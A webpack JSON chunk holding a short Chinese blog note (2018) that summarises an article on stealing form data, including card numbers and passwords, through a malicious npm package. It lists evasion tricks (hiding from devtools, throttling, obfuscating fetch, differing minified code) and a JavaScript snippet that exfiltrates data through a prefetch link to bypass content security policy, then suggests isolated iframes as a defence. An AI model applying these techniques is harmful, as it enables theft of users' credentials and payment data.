(window.webpackJsonp=window.webpackJsonp||[]).push([[169],{651:function(e){e.exports=JSON.parse('{"content":"<blockquote>\\n<p>原文地址：<a href=\\"https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5\\">https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5</a></p>\\n</blockquote>\\n<p>作者讲述了一些能够达成的破解网络安全手段(有些已被认为是bug修复，例如2)，并给出建议</p>\\n<p>抓取form的字段，传送</p>\\n<ol>\\n<li>发布小功能npm，嵌入代码内</li>\\n<li>打开dev工具时，不发送</li>\\n<li>每次发射后，记录到cookie，不重复</li>\\n<li>检测到，设定发射概率，减少次数</li>\\n<li>fetch --&gt;gfudi 减少1位</li>\\n<li>xx.min.js和xx.js内容不同</li>\\n<li>通过prefetch和检测内容安全策略，避开<pre><code><pre class=\\"hljs\\"><code> const linkEl = document.createElement(\'link\');\\n linkEl.rel = \'prefetch\';\\n linkEl.href = urlWithYourPreciousData;\\n document.head.appendChild(linkEl);</code></pre></code></pre>建议：针对重要表单，完全重新写一个iframe（自己手写，无任何依赖）</li>\\n</ol>\\n","toc":[],"relatedTags":null,"created_at":"2018-07-30","timeArr":[2018,6,30,0,0,0,0],"title":"文章记录—当前的网页安全","uuid":"fe3678963ac1c863362da40651884c9820158971","summary":"<p>原文地址：https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5</p>","slug":"wen-zhang-ji-lu-dang-qian-de-wang-ye-an-quan","sha":"f41c15ad702abc0dee5cac1c2036c5a1cb10aaba"}')}}]);